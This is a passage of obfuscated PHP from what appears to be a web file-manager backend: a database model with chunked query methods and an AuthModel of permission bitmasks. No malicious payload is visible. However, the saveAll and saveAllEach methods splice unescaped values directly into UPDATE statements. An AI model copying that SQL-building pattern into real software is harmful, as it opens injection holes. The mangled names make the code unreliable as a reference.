= array($Å¯İÇ‹ => $·ŸŞæ£Ø, $Òƒ“†›ß[97] => $³¿‹²’, $Òƒ“†›ß[453] => $µ¨™ÏÅÎ); } $ê¥Æ®êá = $Òƒ“†›ß[454] . $Ÿ±ü¨Æ‘; CacheLock::lock($ê¥Æ®êá); $éÆóÚö¢->where(array($Å¯İÇ‹ => $·ŸŞæ£Ø))->addAll($¥™³Íñ÷, array(), !0); CacheLock::unlock($ê¥Æ®êá); return !0; } public function metaGet($–û½Äçƒ, $ø»»êê = false) { $õ€¸ì¥À =& $_SERVER[ÅÄÇĞô]; if (!$this->tableMeta) { return array(); } $¸Œ¸ıüÙ = $this->tableMeta[$õ€¸ì¥À[450]]; $ Çİ½¾” = Model($this->tableMeta[$õ€¸ì¥À[451]]); if ($ø»»êê) { $‚„ñİ° = array($¸Œ¸ıüÙ => $–û½Äçƒ, $õ€¸ì¥À[97] => $ø»»êê); return $ Çİ½¾”->where($‚„ñİ°)->getField($õ€¸ì¥À[453]); } $‚„ñİ° = array($¸Œ¸ıüÙ => $–û½Äçƒ); $ãÅÕÎ‘Š = $ Çİ½¾”->field($õ€¸ì¥À[455])->where($‚„ñİ°)->select(); $ãÅÕÎ‘Š = array_to_keyvalue($ãÅÕÎ‘Š, $õ€¸ì¥À[97], $õ€¸ì¥À[453]); return $ãÅÕÎ‘Š; } private function checkDataAutoHas($ÃÇÌ¾ Ş) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $¢úĞ‚ŞÕ) { if (in_array($ÃÇÌ¾ Ş, explode($_SERVER[ÅÄÇĞô][50], $¢úĞ‚ŞÕ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ˆ˜«¤ª, $ ÓÜàÎÊ) { $ã›¶Ï’¢ =& $_SERVER[ÅÄÇĞô]; if (!is_array($ˆ˜«¤ª)) { return; } foreach ($this->dataAuto as $Šç£Ü¤æ) { $×Ôû•ˆ = $Šç£Ü¤æ[0]; if (!in_array($ ÓÜàÎÊ, explode($ã›¶Ï’¢[50], $Šç£Ü¤æ[2]))) { continue; } switch (trim($Šç£Ü¤æ[3])) { case $ã›¶Ï’¢[399]: case $ã›¶Ï’¢[400]: $èĞëõŒ® = $Šç£Ü¤æ[1]; $àâ®óˆÁ = isset($Šç£Ü¤æ[4]) ? (array) $Šç£Ü¤æ[4] : array(); if ($èĞëõŒ® == $ã›¶Ï’¢[207] && array_key_exists($×Ôû•ˆ, $ˆ˜«¤ª)) { if (!$ˆ˜«¤ª[$×Ôû•ˆ]) { unset($ˆ˜«¤ª[$×Ôû•ˆ]); } break; } if (isset($ˆ˜«¤ª[$×Ôû•ˆ])) { array_unshift($àâ®óˆÁ, $ˆ˜«¤ª[$×Ôû•ˆ]); } if ($ã›¶Ï’¢[399] == $Šç£Ü¤æ[3]) { $ˆ˜«¤ª[$×Ôû•ˆ] = call_user_func_array($èĞëõŒ®, $àâ®óˆÁ); } else { $ˆ˜«¤ª[$×Ôû•ˆ] = call_user_func_array(array(&$this, $èĞëõŒ®), $àâ®óˆÁ); } break; case $ã›¶Ï’¢[350]: if (isset($ˆ˜«¤ª[$×Ôû•ˆ]) && $ˆ˜«¤ª[$×Ôû•ˆ]) { $ˆ˜«¤ª[$×Ôû•ˆ] = call_user_func_array(array(&$this, $Šç£Ü¤æ[1]), array($ˆ˜«¤ª[$×Ôû•ˆ])); } break; case $ã›¶Ï’¢[353]: $ˆ˜«¤ª[$×Ôû•ˆ] = $ˆ˜«¤ª[$Šç£Ü¤æ[1]]; break; case $ã›¶Ï’¢[372]: if (isset($ˆ˜«¤ª[$×Ôû•ˆ]) && !is_string($ˆ˜«¤ª[$×Ôû•ˆ])) { $ˆ˜«¤ª[$×Ôû•ˆ] = json_encode_force($ˆ˜«¤ª[$×Ôû•ˆ]); } break; case $ã›¶Ï’¢[401]: if ($ˆ˜«¤ª[$×Ôû•ˆ] === $ã›¶Ï’¢[12]) { unset($ˆ˜«¤ª[$×Ôû•ˆ]); } break; case $ã›¶Ï’¢[402]: $ˆ˜«¤ª[$×Ôû•ˆ] = $Šç£Ü¤æ[1]; default: break; } } if ($ ÓÜàÎÊ == $ã›¶Ï’¢[433]) { $âšš£º¿ = strtolower($this->db->getDbType()); if (strpos($âšš£º¿, $ã›¶Ï’¢[13]) !== 0) { return; } $Ö¬¿³‚ = $this->field(!0)->fields; $˜éÛíÜ“ = $Ö¬¿³‚[$ã›¶Ï’¢[332]]; if (isset($Ö¬¿³‚[$ã›¶Ï’¢[331]])) { unset($˜éÛíÜ“[$Ö¬¿³‚[$ã›¶Ï’¢[331]]]); } foreach ($˜éÛíÜ“ as $óÁá¥Õ„ => $ ÓÜàÎÊ) { if (!isset($ˆ˜«¤ª[$óÁá¥Õ„])) { $ˆ˜«¤ª[$óÁá¥Õ„] = $ã›¶Ï’¢[12]; } } } } private function dataAfterFilter(&$á¢·İíı) { $‡óæ¸À… =& $_SERVER[ÅÄÇĞô]; foreach ($this->dataAuto as $á•Ëˆ¾±) { $¦ØÔ°šØ = $á•Ëˆ¾±[0]; if (!isset($á¢·İíı[$¦ØÔ°šØ])) { continue; } if (!in_array($‡óæ¸À…[435], explode($‡óæ¸À…[50], $á•Ëˆ¾±[2]))) { continue; } switch (trim($á•Ëˆ¾±[3])) { case $‡óæ¸À…[399]: case $‡óæ¸À…[400]: $™ ıŞşå = isset($á•Ëˆ¾±[4]) ? (array) $á•Ëˆ¾±[4] : array(); array_unshift($™ ıŞşå, $á¢·İíı[$¦ØÔ°šØ]); if (isset($á•Ëˆ¾±[4]) && $á•Ëˆ¾±[4] == $‡óæ¸À…[456]) { $™ ıŞşå = array($á¢·İíı[$¦ØÔ°šØ]); } if ($‡óæ¸À…[399] == $á•Ëˆ¾±[3]) { $á¢·İíı[$¦ØÔ°šØ] = call_user_func_array($á•Ëˆ¾±[1], $™ ıŞşå); } else { $á¢·İíı[$¦ØÔ°šØ] = call_user_func_array(array(&$this, $á•Ëˆ¾±[1]), $™ ıŞşå); } break; case $‡óæ¸À…[350]: if (isset($á¢·İíı[$¦ØÔ°šØ]) && $á¢·İíı[$¦ØÔ°šØ]) { $á¢·İíı[$¦ØÔ°šØ] = call_user_func_array(array(&$this, $á•Ëˆ¾±[1]), array($á¢·İíı[$¦ØÔ°šØ])); } break; case $‡óæ¸À…[353]: $á¢·İíı[$¦ØÔ°šØ] = $á¢·İíı[$á•Ëˆ¾±[1]]; break; case $‡óæ¸À…[372]: $äßÑ©•À = $á¢·İíı[$¦ØÔ°šØ]; $á¢·İíı[$¦ØÔ°šØ] = json_decode($äßÑ©•À, !0); if (is_null($á¢·İíı[$¦ØÔ°šØ])) { $á¢·İíı[$¦ØÔ°šØ] = $äßÑ©•À; } break; case $‡óæ¸À…[401]: if ($á¢·İíı[$¦ØÔ°šØ] === $‡óæ¸À…[12]) { unset($á¢·İíı[$¦ØÔ°šØ]); } break; case $‡óæ¸À…[402]: $á¢·İíı[$¦ØÔ°šØ] = $á•Ëˆ¾±[1]; break; default: break; } } } public function saveAll($›ş°Ï‡Ø) { $ôâÊ¢šÃ =& $_SERVER[ÅÄÇĞô]; $†ÀßÀ‹­ = $this->tablePrefix . $this->tableName; $Àê†ñõÄ = self::SQL_WHERE_IN_CHUNK; $›ş°Ï‡Ø = is_array($›ş°Ï‡Ø) ? $›ş°Ï‡Ø : array(); $ëœ‘åİ = $ôâÊ¢šÃ[457]; $®‘‘Ğö = 0; $ÙıœÈ¹ú = array(); $ÎÎŞîİ = count($›ş°Ï‡Ø); for ($Ó»…úŞ = 0; $Ó»…úŞ < $ÎÎŞîİ; $Ó»…úŞ++) { $ÜëÃÂ´ = $›ş°Ï‡Ø[$Ó»…úŞ]; if (!is_array($ÜëÃÂ´) || count($ÜëÃÂ´) != 4) { continue; } $«ÛÊæ×Ş = "\x55\x50\x44\101\124\105\40\x60{$†ÀßÀ‹­}\140\x20\123\105\x54\40{$ÜëÃÂ´[2]}\x20\x3d\x20\103\101\123\x45\40{$ÜëÃÂ´[0]}\x20\12"; if ($®‘‘Ğö == 0) { $ëœ‘åİ = $«ÛÊæ×Ş; } $ÙıœÈ¹ú[] = $ôâÊ¢šÃ[121] . $ÜëÃÂ´[1] . $ôâÊ¢šÃ[121]; $®‘‘Ğö++; $ëœ‘åİ .= "\40\127\x48\x45\116\x20\x27{$ÜëÃÂ´[1]}\47\40\x54\110\x45\116\40\47{$ÜëÃÂ´[3]}\47\x20\xa"; if ($®‘‘Ğö == $Àê†ñõÄ || $Ó»…úŞ == $ÎÎŞîİ - 1) { $ä´ğò¾ = implode($ôâÊ¢šÃ[50], $ÙıœÈ¹ú); $ëœ‘åİ .= "\x20\x45\x4e\104\x20\40\127\x48\105\122\x45\x20{$ÜëÃÂ´[0]}\x20\111\116\x20\x28{$ä´ğò¾}\x29\40"; $this->execute($ëœ‘åİ); $®‘‘Ğö = 0; $ëœ‘åİ = $«ÛÊæ×Ş; $this->chunkEventCheck(count($ÙıœÈ¹ú)); $ÙıœÈ¹ú = array(); } } $this->chunkEventSet(); } public function saveAllEach($‚Ì„ó·) { $Ééƒ·Û =& $_SERVER[ÅÄÇĞô]; $“Øò‰Û× = $this->tablePrefix . $this->tableName; foreach ($‚Ì„ó· as $…†©òşš) { if (!is_array($…†©òşš) || count($…†©òşš) != 4) { continue; } $å¬¡”‹É = $…†©òşš[0] . $Ééƒ·Û[458] . $…†©òşš[1] . $Ééƒ·Û[121]; $×Ñöº°Ö = $…†©òşš[2] . $Ééƒ·Û[458] . $…†©òşš[3] . $Ééƒ·Û[121]; $èßôòÙ = "\x75\x70\x64\x61\x74\x65\x20{$“Øò‰Û×}\x20\163\145\x74\x20{$×Ñöº°Ö}\40\x77\150\x65\162\x65\x20{$å¬¡”‹É}\x3b"; $this->execute($èßôòÙ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ŒúÙğé = false, $Ì–á˜İ’ = false) { $this->_chunkEvent = $ŒúÙğé; $this->_chunkEventParam = $Ì–á˜İ’; } private function chunkEventCheck($¢€µ°Ç¥) { if (!$this->_chunkEvent) { return; } $‡Ïşø…Ä = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $‡Ïşø…Ä[$_SERVER[ÅÄÇĞô][459]] = $¢€µ°Ç¥; Hook::trigger($this->_chunkEvent, $‡Ïşø…Ä); } public function addAll($İòÉœªí, $äêê…¨ = array(), $ÔµëıÏ› = false) { $º‹˜’ª° =& $_SERVER[ÅÄÇĞô]; ignore_timeout(); $ŞÔÓÛ­° = self::SQL_WHERE_IN_CHUNK; if (empty($İòÉœªí)) { $this->error = think_lang($º‹˜’ª°[351]); return !1; } $äêê…¨ = $this->_parseOptions($äêê…¨); foreach ($İòÉœªí as $ßàÀ°í => $‚à¸¾Õ) { $İòÉœªí[$ßàÀ°í] = $this->_facade($‚à¸¾Õ); $this->_beforeInsert($İòÉœªí[$ßàÀ°í], $äêê…¨); } if (method_exists($this->db, $º‹˜’ª°[352])) { for ($òä¶´÷ = 0; $òä¶´÷ < count($İòÉœªí); $òä¶´÷ += $ŞÔÓÛ­°) { $™Ëø¤úí = array_slice($İòÉœªí, $òä¶´÷, $ŞÔÓÛ­°); if (!is_array($™Ëø¤úí) || count($™Ëø¤úí) == 0) { break; } $•€øµ’Ä = $this->db->insertAll($™Ëø¤úí, $äêê…¨, $ÔµëıÏ›); $this->chunkEventCheck(count($™Ëø¤úí)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($İòÉœªí as $ßàÀ°í => $‚à¸¾Õ) { $•€øµ’Ä = $this->db->insert($‚à¸¾Õ, $äêê…¨, $ÔµëıÏ›); } $this->commit(); } if (!1 !== $•€øµ’Ä) { $»¼ì­‘  = $this->getLastInsID(); if ($»¼ì­‘ ) { return $»¼ì­‘ ; } } return $•€øµ’Ä; } public function save($ıÀ°é› = '', $ê‰¥’Ó = array()) { $à£”Õ×ñ =& $_SERVER[ÅÄÇĞô]; $èãÛÔà± = self::SQL_WHERE_IN_CHUNK; $•‹‘ä› = $this->optionsValue(); $Í€¯ã©Â = $this->findWhereField($•‹‘ä›); if (!$Í€¯ã©Â) { return parent::save($ıÀ°é›, $ê‰¥’Ó); } $¡„ÇªË = 0; $ÕğÛ“µ = $•‹‘ä›[$à£”Õ×ñ[355]][$Í€¯ã©Â][1]; $ÕğÛ“µ = is_array($ÕğÛ“µ) ? $ÕğÛ“µ : array(); $ §ºåÈ¥ = count($ÕğÛ“µ); for ($šÀã®…¢ = 0; $šÀã®…¢ < $ §ºåÈ¥; $šÀã®…¢ += $èãÛÔà±) { $ş¸æ’ï• = array_slice($ÕğÛ“µ, $šÀã®…¢, $èãÛÔà±); if (!is_array($ş¸æ’ï•) || count($ş¸æ’ï•) == 0) { break; } $•‹‘ä›[$à£”Õ×ñ[355]][$Í€¯ã©Â][1] = $ş¸æ’ï•; $this->optionsValue($•‹‘ä›); $¡„ÇªË += parent::save($ıÀ°é›, $ê‰¥’Ó); $this->chunkEventCheck(count($ş¸æ’ï•)); } $this->chunkEventSet(); return $¡„ÇªË; } public function add($ù®«»‹· = '', $½‡¹™ÇŞ = array(), $Ù¼È°Ì” = false) { if ($this->addTaskStatus && is_array($ù®«»‹·)) { $this->addTaskData[] = $ù®«»‹·; return; } return parent::add($ù®«»‹·, $½‡¹™ÇŞ, $Ù¼È°Ì”); } public function parseWhereLike($ÀÜöÕŠ‡, $Æ­†ÅÄ½ = '', $ ÏÂÁ°… = false, &$×™†ÙêÖ = false) { $ïì½¯˜É =& $_SERVER[ÅÄÇĞô]; $£†§í = $GLOBALS[$ïì½¯˜É[6]][$ïì½¯˜É[460]]; if (!$£†§í[$ïì½¯˜É[461]]) { return $ÀÜöÕŠ‡; } if (!is_array($ÀÜöÕŠ‡)) { return $ÀÜöÕŠ‡; } $¶ö„ŸÓÏ = array(); $Şèáö†Ï = 0; foreach ($ÀÜöÕŠ‡ as $šö°®®Ñ => $³ÉÎøÛâ) { if (is_array($³ÉÎøÛâ) && count($³ÉÎøÛâ) == 2 && $³ÉÎøÛâ[0] == $ïì½¯˜É[462] && is_string($³ÉÎøÛâ[1]) && substr($³ÉÎøÛâ[1], 0, 1) == $ïì½¯˜É[463] && substr($³ÉÎøÛâ[1], strlen($³ÉÎøÛâ[1]) - 1, 1) == $ïì½¯˜É[463]) { $×™†ÙêÖ = !0; $ÅåÎ°ç… = is_string($šö°®®Ñ) ? $šö°®®Ñ : $Æ­†ÅÄ½; $Üö ¼üÜ = substr($³ÉÎøÛâ[1], 1, strlen($³ÉÎøÛâ[1]) - 2); $Üö ¼üÜ = $this->db->escapeString($Üö ¼üÜ); if (!strpos($ÅåÎ°ç…, $ïì½¯˜É[10])) { $ÅåÎ°ç… = $ïì½¯˜É[464] . $ÅåÎ°ç… . $ïì½¯˜É[464]; } $åÜŞãßó = $ïì½¯˜É[223] . $Üö ¼üÜ . $ïì½¯˜É[223]; $Üö ¼üÜ = str_replace(array($ïì½¯˜É[10], $ïì½¯˜É[465], $ïì½¯˜É[11]), $ïì½¯˜É[466], $Üö ¼üÜ); if ($£†§í[$ïì½¯˜É[467]]) { $åÜŞãßó = $ïì½¯˜É[468] . $Üö ¼üÜ . $ïì½¯˜É[469]; if ($£†§í[$ïì½¯˜É[470]]) { $åÜŞãßó = $ïì½¯˜É[469] . $Üö ¼üÜ . $ïì½¯˜É[468]; } } $¶ö„ŸÓÏ[$Şèáö†Ï] = $ïì½¯˜É[471] . $ÅåÎ°ç… . $ïì½¯˜É[472] . $åÜŞãßó . $ïì½¯˜É[473]; $Şèáö†Ï++; continue; } if (is_array($³ÉÎøÛâ)) { $Æ­†ÅÄ½ = is_string($šö°®®Ñ) ? $šö°®®Ñ : $Æ­†ÅÄ½; $³ÉÎøÛâ = $this->parseWhereLike($³ÉÎøÛâ, $Æ­†ÅÄ½, !0, $×™†ÙêÖ); } if (is_numeric($šö°®®Ñ)) { $¶ö„ŸÓÏ[$Şèáö†Ï] = $³ÉÎøÛâ; $Şèáö†Ï++; } else { $¶ö„ŸÓÏ[$šö°®®Ñ] = $³ÉÎøÛâ; } } if ($×™†ÙêÖ && !$ ÏÂÁ°…) { } return $¶ö„ŸÓÏ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ùòÂ­º• = array()) { $ŒÂƒë•º =& $_SERVER[ÅÄÇĞô]; $—ÄŞÜ…ˆ = self::SQL_WHERE_IN_CHUNK; $£ÃÑ‡¾” = $this->optionsValue(); $«…íŠ´¨ = $this->findWhereField($£ÃÑ‡¾”); if (!$«…íŠ´¨ || isset($£ÃÑ‡¾”[$ŒÂƒë•º[370]]) || isset($£ÃÑ‡¾”[$ŒÂƒë•º[431]])) { return parent::select($ùòÂ­º•); } $ÉÔñİ©¸ = $£ÃÑ‡¾”[$ŒÂƒë•º[355]][$«…íŠ´¨][1]; $ÉÔñİ©¸ = is_array($ÉÔñİ©¸) ? $ÉÔñİ©¸ : array(); $¥­à…‚ø = null; for ($šúòÅŒ– = 0; $šúòÅŒ– < count($ÉÔñİ©¸); $šúòÅŒ– += $—ÄŞÜ…ˆ) { $Á¬ŞóœÃ = array_slice($ÉÔñİ©¸, $šúòÅŒ–, $—ÄŞÜ…ˆ); if (!is_array($Á¬ŞóœÃ) || count($Á¬ŞóœÃ) == 0) { break; } $£ÃÑ‡¾”[$ŒÂƒë•º[355]][$«…íŠ´¨][1] = $Á¬ŞóœÃ; $this->optionsValue($£ÃÑ‡¾”); $ª”øÆß = parent::select($ùòÂ­º•); if (!$ª”øÆß) { continue; } $¥­à…‚ø = is_array($¥­à…‚ø) ? $¥­à…‚ø : array(); $¥­à…‚ø = array_merge($¥­à…‚ø, $ª”øÆß); } return $¥­à…‚ø; } public function delete($ÙÓ„”—• = array()) { $¢‘í¥…º =& $_SERVER[ÅÄÇĞô]; $®ß“ß½Ì = self::SQL_WHERE_IN_CHUNK; $‰˜ÀĞ‘Ñ = $this->optionsValue(); $ûáèîØİ = $this->findWhereField($‰˜ÀĞ‘Ñ); if (!$ûáèîØİ) { return parent::delete($ÙÓ„”—•); } $ÁÍ’´‚Í = 0; $÷îÆÕ‘ = $‰˜ÀĞ‘Ñ[$¢‘í¥…º[355]][$ûáèîØİ][1]; $÷îÆÕ‘ = is_array($÷îÆÕ‘) ? $÷îÆÕ‘ : array(); for ($ÕÇµÒ¿ = 0; $ÕÇµÒ¿ < count($÷îÆÕ‘); $ÕÇµÒ¿ += $®ß“ß½Ì) { $Š£¡ÊïÌ = array_slice($÷îÆÕ‘, $ÕÇµÒ¿, $®ß“ß½Ì); if (!is_array($Š£¡ÊïÌ) || count($Š£¡ÊïÌ) == 0) { break; } $‰˜ÀĞ‘Ñ[$¢‘í¥…º[355]][$ûáèîØİ][1] = $Š£¡ÊïÌ; $this->optionsValue($‰˜ÀĞ‘Ñ); $ÁÍ’´‚Í += parent::delete($ÙÓ„”—•); } return $ÁÍ’´‚Í; } private function findWhereField($á¨Õ“ö) { $ìÏı·ğ› =& $_SERVER[ÅÄÇĞô]; $©ÉïÖÊÓ = self::SQL_WHERE_IN_CHUNK; if (!is_array($á¨Õ“ö) || !is_array($á¨Õ“ö[$ìÏı·ğ›[355]])) { return !1; } foreach ($á¨Õ“ö[$ìÏı·ğ›[355]] as $ÅÚé°šÄ => $ê‡“«®) { if (is_array($ê‡“«®) && isset($ê‡“«®[0]) && is_string($ê‡“«®[0]) && strtolower($ê‡“«®[0]) == $ìÏı·ğ›[7] && is_array($ê‡“«®[1]) && count($ê‡“«®[1]) > $©ÉïÖÊÓ) { ignore_timeout(); return $ÅÚé°šÄ; } } return !1; } public function setMasterDB($–ëÉ¼† = true) { think_config($_SERVER[ÅÄÇĞô][474], $–ëÉ¼†); } } goto E˜Îñ¦‰“; BÄÁÛ»‹²: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $âÉ×Ø =& $_SERVER[ÅÄÇĞô]; $•š¼– = array(array($âÉ×Ø[497] => LNG($âÉ×Ø[1999]), $âÉ×Ø[2000] => $âÉ×Ø[2001], $âÉ×Ø[2002] => 1, $âÉ×Ø[2003] => 1, $âÉ×Ø[2004] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($âÉ×Ø[497] => LNG($âÉ×Ø[2005]), $âÉ×Ø[2000] => $âÉ×Ø[2006], $âÉ×Ø[2002] => 2, $âÉ×Ø[2003] => 1, $âÉ×Ø[2004] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($âÉ×Ø[497] => LNG($âÉ×Ø[2007]), $âÉ×Ø[2000] => $âÉ×Ø[2008], $âÉ×Ø[2002] => 3, $âÉ×Ø[2003] => 1, $âÉ×Ø[2004] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($âÉ×Ø[497] => LNG($âÉ×Ø[2009]), $âÉ×Ø[2000] => $âÉ×Ø[2010], $âÉ×Ø[2002] => 4, $âÉ×Ø[2003] => 1, $âÉ×Ø[2004] => self::AUTH_SHOW | self::AUTH_VIEW), array($âÉ×Ø[497] => LNG($âÉ×Ø[2011]), $âÉ×Ø[2000] => $âÉ×Ø[2012], $âÉ×Ø[2002] => 5, $âÉ×Ø[2003] => 1, $âÉ×Ø[2004] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($âÉ×Ø[497] => LNG($âÉ×Ø[2013]), $âÉ×Ø[2000] => $âÉ×Ø[2014], $âÉ×Ø[2002] => 6, $âÉ×Ø[2003] => 1, $âÉ×Ø[2004] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($âÉ×Ø[497] => LNG($âÉ×Ø[2015]), $âÉ×Ø[2000] => $âÉ×Ø[2016], $âÉ×Ø[2002] => 7, $âÉ×Ø[2003] => 1, $âÉ×Ø[2004] => 0)); return $•š¼–; } public static function authCheck($Çô¢Õ², $Â‹®ÃŸ) { $×ÜÃƒÆ” =& $_SERVER[ÅÄÇĞô]; $Çô¢Õ² = intval($Çô¢Õ²); if (KodUser::isRoot() && $GLOBALS[$×ÜÃƒÆ”[6]][$×ÜÃƒÆ”[2017]]) { return !0; } if ($Çô¢Õ² <= 0) { return !1; } if (($Çô¢Õ² & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Çô¢Õ² & $Â‹®ÃŸ); } public static function authCheckShow($¯½şé¼Ù) { return self::authCheck($¯½şé¼Ù, self::AUTH_SHOW); } public static function authCheckView($¸à÷‰¤) { return self::authCheck($¸à÷‰¤, self::AUTH_VIEW); } public static function authCheckDownload($²ïòÉ†à) { return self::authCheck($²ïòÉ†à, self::AUTH_DOWNLOAD); } public static function authCheckUpload($†Û»”£) { return self::authCheck($†Û»”£, self::AUTH_UPLOAD); } public static function authCheckEdit($Ğä¯«ö) { return self::authCheck($Ğä¯«ö, self::AUTH_EDIT); } public static function authCheckRemove($ü¯û›†è) { return self::authCheck($ü¯û›†è, self::AUTH_REMOVE); } public static function authCheckShare($ßçá²””) { return self::authCheck($ßçá²””, self::AUTH_SHARE); } public static function authCheckComment($¦ì¡‰) { return self::authCheck($¦ì¡‰, self::AUTH_COMMENT); } public static function authCheckEvent($Î†ïì‹Ü) { return self::authCheck($Î†ïì‹Ü, self::AUTH_EVENT); } public static function authCheckRoot($Ş–ì¶äæ) { return self::authCheck($Ş–ì¶äæ, self::AUTH_ROOT); } public static function authCheckAction($âª›ôÆ³, $”Ää¼™ë) { $Ë‚¥ÈØŞ =& $_SERVER[ÅÄÇĞô]; $ù„¥ü•± = array($Ë‚¥ÈØŞ[2018] => self::AUTH_VIEW, $Ë‚¥ÈØŞ[1302] => self::AUTH_DOWNLOAD, $Ë‚¥ÈØŞ[110] => self::AUTH_UPLOAD, $Ë‚¥ÈØŞ[1967] => self::AUTH_EDIT, $Ë‚¥ÈØŞ[1966] => self::AUTH_REMOVE, $Ë‚¥ÈØŞ[1977] => self::AUTH_SHARE, $Ë‚¥ÈØŞ[432] => self::AUTH_COMMENT, $Ë‚¥ÈØŞ[1784] => self::AUTH_EVENT, $Ë‚¥ÈØŞ[2019] => self::AUTH_ROOT); if (!isset($ù„¥ü•±[$”Ää¼™ë])) { return; } $íùÛÖô = $ù„¥ü•±[$”Ää¼™ë]; $âª›ôÆ³ = intval($âª›ôÆ³); if ($âª›ôÆ³ <= 0) { return !1; } if (($âª›ôÆ³ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($âª›ôÆ³ & $íùÛÖô); } public static function authDisable($Š¢ô´Ñ, $âèßà”Ä) { if (intval($Š¢ô´Ñ) <= 0) { return 0; } return intval($Š¢ô´Ñ) & ~$âèßà”Ä; } public $optionType = "\x53\x79\x73\x74\145\x6d\56\163\157\x75\162\143\x65\x41\x75\164\150\x4c\151\163\x74"; public $field = array("\x6e\141\155\x65", "\141\165\164\150", "\154\141\x62\x65\154", "\x64\151\163\160\154\141\171", "\x73\x79\x73\164\x65\155", "\163\x6f\x72\x74"); public function initData() { $‘±Ëæ²· = $this->authDefault(); foreach ($‘±Ëæ²· as $‘µ¦¾£Å) { $this->add($‘µ¦¾£Å); } } public function findAuth($Äøƒ¦¢§, $ùâÜÑ‹™) { $à¨©¥÷Í =& $_SERVER[ÅÄÇĞô]; $ˆÉ«Ğ– = parent::listData(); foreach ($ˆÉ«Ğ– as $É„ƒÛäá) { $ïÔ—âËµ = intval($É„ƒÛäá[$à¨©¥÷Í[490]]); if ($ïÔ—âËµ <= 0 || $É„ƒÛäá[$à¨©¥÷Í[2020]] == 0) { continue; } if (($ïÔ—âËµ & $Äøƒ¦¢§) != $Äøƒ¦¢§) { continue; } if (($ïÔ—âËµ & $ùâÜÑ‹™) != 0) { continue; } return $É„ƒÛäá[$à¨©¥÷Í[478]]; } return !1; } public function findAuthMax($îÈô¾‡İ, $¹Êâå²¢) { $Ñã¬è =& $_SERVER[ÅÄÇĞô]; $´ïÅ¿ÎÉ = !1; $ÆŸÃ‰ïö = parent::listData(); foreach ($ÆŸÃ‰ïö as $¶™™Üš¡) { $¸ß¯‚ŞŸ = intval($¶™™Üš¡[$Ñã¬è[490]]); if ($¸ß¯‚ŞŸ <= 0 || $¶™™Üš¡[$Ñã¬è[2020]] == 0) { continue; } if (($¸ß¯‚ŞŸ & $îÈô¾‡İ) != $îÈô¾‡İ) { continue; } if (($¸ß¯‚ŞŸ & $¹Êâå²¢) != 0) { continue; } if (!$´ïÅ¿ÎÉ) { $´ïÅ¿ÎÉ = $¶™™Üš¡; continue; } if (intval($´ïÅ¿ÎÉ[$Ñã¬è[490]]) < $¸ß¯‚ŞŸ) { $´ïÅ¿ÎÉ = $¶™™Üš¡; } } return $´ïÅ¿ÎÉ ? $´ïÅ¿ÎÉ[$Ñã¬è[478]] : !1; } public function findAuthReadOnly() { $§¿Æ‡«· = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $¯øÄ»ş£ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($§¿Æ‡«·, $¯øÄ»ş£); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ƒËöÑÖú =& $_SERVER[ÅÄÇĞô]; $© ‚—ÕÉ = parent::listData(); $¨´ğ‚‘ = !1; foreach ($© ‚—ÕÉ as $û—è) { if ($û—è[$ƒËöÑÖú[490]] <= 0 || $û—è[$ƒËöÑÖú[2020]] == $ƒËöÑÖú[231]) { continue; } if (!$¨´ğ‚‘) { $¨´ğ‚‘ = $û—è; continue; } if ($¨´ğ‚‘[$ƒËöÑÖú[490]] > $û—è[$ƒËöÑÖú[490]]) { $¨´ğ‚‘ = $û—è; } } return $¨´ğ‚‘ ? $¨´ğ‚‘[$ƒËöÑÖú[478]] : $ƒËöÑÖú[12]; } public function listData($ÛÜ¤ş‡Œ = false, $»¡¢­¯® = "\163\157\x72\164", $÷¿ùø®³ = false) { return parent::listData($ÛÜ¤ş‡Œ, $»¡¢­¯®, $÷¿ùø®³); } public function update($¾Œ¨Ğôä, $Æ‰¸æ) { $¼ïÙŠí€ =& $_SERVER[ÅÄÇĞô]; $°ª¿’úË = parent::listData($¾Œ¨Ğôä); $Ò´¥Á«ï = $this->findByName($Æ‰¸æ[$¼ïÙŠí€[32]]); if (!$°ª¿’úË || $Ò´¥Á«ï && $Ò´¥Á«ï[$¼ïÙŠí€[478]] != $°ª¿’úË[$¼ïÙŠí€[478]]) { return !1; } 